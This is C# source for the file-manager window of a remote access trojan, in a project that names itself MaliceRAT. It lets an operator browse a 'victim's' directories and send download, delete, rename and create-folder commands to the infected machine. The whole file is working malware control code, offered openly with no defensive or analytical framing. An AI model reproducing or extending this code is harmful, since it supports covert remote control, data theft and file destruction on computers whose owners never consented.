using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Web.Script.Serialization;
using MaliceRAT.RatServer;

namespace MaliceRAT.RatUI
{
    public partial class FileManagerForm : Form
    {
        #region Variables
        private int victimId;
        private Server server;
        #endregion

        #region Constructor
        public FileManagerForm(int victimId, Server server)
        {
            InitializeComponent();
            this.victimId = victimId;
            this.server = server;

            server.FilesAndFoldersReceived += OnFilesAndFoldersReceived;

            titleLabel.Text = $"File Manager [{server.GetVictimById(victimId).User}]";
        }
        #endregion

        #region Methods
        private void OnFilesAndFoldersReceived(Victim victim, string filesAndFoldersJson)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => OnFilesAndFoldersReceived(victim, filesAndFoldersJson)));
                return;
            }

            JavaScriptSerializer serializer = new JavaScriptSerializer();
            Dictionary<string, Dictionary<string, string>> filesAndFolders = serializer.Deserialize<Dictionary<string, Dictionary<string, string>>>(filesAndFoldersJson);
            gunaFilesTable.Rows.Clear();
            foreach (var entry in filesAndFolders)
            {
                var row = new DataGridViewRow();
                row.CreateCells(gunaFilesTable, entry.Key, entry.Value["Type"], entry.Value["Size"]);
                gunaFilesTable.Rows.Add(row);
            }
        }

        private void FileManagerForm_Load(object sender, EventArgs e)
        {   
            ReadDirectory(gunadirPath.Text);
        }

        private void gunadirPath_TextChanged(object sender, EventArgs e)
        {
            ReadDirectory(gunadirPath.Text);
        }
        #endregion

        #region Files context menu
        private string GetPath()
        {
            return gunadirPath.Text + GetSelectedFile();
        }

        private string GetSelectedFile()
        {
            return gunaFilesTable.SelectedCells[0].Value.ToString();
        }

        private void InitializeContextMenu()
        {
            ContextMenuStrip victimContextMenu = new ContextMenuStrip();
            var menuItems = new[]
            {
                ContextMenuUtilities.CreateContextMenuItem("Download", Download_Click),
                ContextMenuUtilities.CreateContextMenuItem("Delete", Delete_Click),
                ContextMenuUtilities.CreateContextMenuItem("Rename", Rename_Click),
                ContextMenuUtilities.CreateContextMenuItem("Create Folder", CreateFolder_Click)
            };

            victimContextMenu.Items.AddRange(menuItems);
            gunaFilesTable.ContextMenuStrip = victimContextMenu;
            gunaFilesTable.MouseDown += (sender, e) => ContextMenuUtilities.GunaTable_MouseDown(sender, e, gunaFilesTable);
        }

        private void gunaFilesTable_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                gunaFilesTable.ContextMenuStrip.Show(Cursor.Position);
            }
        }

        private void Download_Click(object sender, EventArgs e)
        {
            server.GetVictimById(victimId).Send(new { type = "download", path = GetPath() });
        }

        private void Delete_Click(object sender, EventArgs e)
        {
            server.GetVictimById(victimId).Send(new { type = "delete", path = GetPath() });
        }

        private void Rename_Click(object sender, EventArgs e)
        {
            server.GetVictimById(victimId).Send(new { type = "rename", path = GetPath() });
        }

        private void CreateFolder_Click(object sender, EventArgs e)
        {
            server.GetVictimById(victimId).Send(new { type = "create_folder", path = GetPath() });
        }

        private void ReadDirectory(string path)
        {
            server.GetVictimById(victimId).Send(new { type = "read_directory", path });
        }

        #endregion
    }
}